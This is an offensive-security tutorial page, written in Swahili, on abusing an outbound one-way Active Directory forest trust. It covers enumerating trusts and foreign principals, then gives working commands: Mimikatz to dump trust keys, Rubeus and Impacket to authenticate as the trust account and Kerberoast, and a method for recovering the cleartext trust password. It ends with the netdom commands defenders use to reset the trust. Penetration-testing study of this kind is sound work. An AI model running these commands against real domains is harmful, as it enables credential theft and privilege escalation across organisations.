# Kikoa cha Forest ya Nje - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

Katika hali hii, **domain yako** inaamini **privileges** fulani kwa principals kutoka **domain/forest** tofauti.

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Ikiwa una AD module, kagua moja kwa moja **Trusted Domain Object (TDO)** pia. Hii inakupa data ghafi ya trust inayotegemea LDAP utakayohitaji baadaye unapoamua kama njia rahisi ni **FSP/group abuse** au **trust-account abuse**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Unapaswa pia kuorodhesha mahali ambapo foreign principals kutoka `CN=ForeignSecurityPrincipals` walipewa access. Mifano ya kawaida ni:

- **Local admin** kwenye server/DC katika domain yako ya sasa
- Uanachama katika **custom domain group** yenye ACLs juu ya users/computers/GPOs
- Ruhusa za kurekebisha **computer objects**, ambazo baadaye zinaweza kutumika kwa [RBCD](resource-based-constrained-delegation.md) ikiwa trust configuration inaruhusu

## Trust Account Attack

Wakati one-way trust inaundwa kutoka domain/forest **B** kwenda domain/forest **A** (**B trusts A**), **trust account** ya **B** huundwa ndani ya **A**. Katika outbound-trust view ya **A**, hii ni muhimu kwa sababu ikiwa baadaye uta-compromise **B** (upande unao-trust), unaweza kudump trust secret huko na ku-authenticate kurudi **A** kama `B$`.<sup>[[1]](#references)</sup>

Jambo muhimu la kuelewa hapa ni kwamba password na Kerberos material ya trust account hiyo zinaweza kutolewa kutoka kwa Domain Controller katika domain **trusting** kwa kutumia:<sup>[[1]](#references)</sup>
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Hii hufanya kazi kwa sababu trust account iliyoundwa katika domain ya **trusted** ni principal iliyowashwa ambayo huishia kuwa na baseline rights za domain user wa kawaida humo. Mara nyingi hilo hutosha kuanza ku-enumerate LDAP, ku-request tickets, na kupata njia inayofuata ya escalation.<sup>[[1]](#references)</sup>

Katika scenario ambapo `ext.local` ni domain ya **trusting** na `root.local` ni domain ya **trusted**, user account yenye jina `EXT$` huundwa ndani ya `root.local`. Kudump trust keys kutoka `ext.local` hufichua credentials zinazoweza kutumika kama `root.local\EXT$` dhidi ya `root.local`:<sup>[[1]](#references)</sup>
```bash
lsadump::trust /patch
```
Baada ya hayo, tumia key ya **RC4** iliyotolewa kufanya uthibitishaji kama `root.local\EXT$` ndani ya `root.local`:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Kisha enumerate domain inayoaminika kama principal huyo, kwa mfano kwa kufanya Kerberoasting ya SPN yenye thamani kubwa katika `root.local`:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Kutoka Linux

Ikiwa ulipata **RC4** trust-account key, wazo hilo hilo linafanya kazi kutoka Linux kwa kutumia Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Ikiwa **RC4** haikubaliwi, tumia **cleartext password** iliyopatikana (au funguo za **AES** zilizotokana nayo) na urudie workflows za kawaida za [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) na [Kerberoast](kerberoast.md) kutoka kwenye foothold hiyo.

### Mambo ya kuzingatia kuhusu key material

Usichanganye **trust keys** na **trust-account credentials**:<sup>[[1]](#references)</sup>

- Katika one-way trust, pande zote mbili huhifadhi **TDO**, lakini akaunti halisi ya mtumiaji **`EXT$` inapatikana tu katika trusted domain**.
- Password ya sasa ya trust-account inaonyeshwa katika trust secret ya TDO (`NewPassword` / current trust key).
- **RC4** trust key ndiyo artifact rahisi zaidi kutumia tena kwa `asktgt` kama trust account; katika setups za kawaida, hii huwa enctype inayofanya kazi kwa sababu trust account mara nyingi huwa na `msDS-SupportedEncryptionTypes` tupu.
- Ikiwa unafikiria kuhusu **AES trust keys**, kumbuka kuwa hazibadilishani na trust-account AES keys kwa sababu salts hutofautiana.

Kwa hiyo, kwa technique iliyo kwenye ukurasa huu, pendelea ama **RC4** material iliyodumpiwa au password ya **cleartext** iliyopatikana.<sup>[[1]](#references)</sup>

### Kukusanya cleartext trust password

Katika flow iliyotangulia, trust hash ilitumika badala ya **cleartext password** (ambayo pia **hutolewa na mimikatz**).<sup>[[1]](#references)</sup>

Cleartext password inaweza kupatikana kwa kubadilisha output ya \[ CLEAR ] kutoka mimikatz kutoka hexadecimal na kuondoa null bytes `\x00`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Kukusanya cleartext trust password: Cleartext password inaweza kupatikana kwa kubadilisha output ya ( CLEAR ) kutoka mimikatz kutoka hexadecimal na kuondoa null...](<../../images/image (938).png>)

Wakati mwingine, trust relationship inapoundwa, password lazima iandikwe na mtumiaji kwa ajili ya trust hiyo. Katika demonstration hii, key ni trust password ya awali na hivyo inaweza kusomeka na binadamu. Key inapozungushwa (default: kila siku 30), cleartext kwa kawaida itaacha kusomeka na binadamu, lakini bado inaweza kutumika kitaalamu.<sup>[[1]](#references)</sup>

Cleartext password inaweza kutumika kufanya authentication ya kawaida kama trust account, kama mbadala wa kuomba TGT kwa kutumia Kerberos secret key ya trust account. Hapa, uki-query `root.local` kutoka `ext.local` kwa ajili ya members wa `Domain Admins`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Kukusanya cleartext trust password: Cleartext password inaweza kutumika kufanya authentication ya kawaida kama trust account, kama mbadala wa kuomba TGT...](<../../images/image (792).png>)

### Vizuizi vya kiutendaji

> [!WARNING]
> Trust accounts ni principals wasio rahisi kutumia. Interactive logons kama **RUNAS / console / RDP** si njia inayotarajiwa hapa, na majaribio ya authentication ya **NTLM** yanaweza kushindikana kwa `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Panga kutumia **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast) badala yake.<sup>[[1]](#references)</sup>

### Dokezo kuhusu Persistence / cleanup

Ikiwa defenders watatambua kuwa trusting domain imecompromise, wanapaswa kuzungusha trust secret kwenye **pande zote mbili** kwa `netdom trust ... /resetOneSide ...`. Kwa mtazamo wa operator, hili ni muhimu kwa sababu **manual reset hubatilisha trust material ya zamani mara moja**, ilhali trust-password rotation ya kawaida huacha thamani za sasa/za awali wakati wa rollover.<sup>[[2]](#references)</sup>
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Marejeleo

- [1] [SID filter as security boundary between domains? (Part 7) – Trust account attack – from trusting to trusted](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [2] [AD Forest Recovery – Kuweka upya trust password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
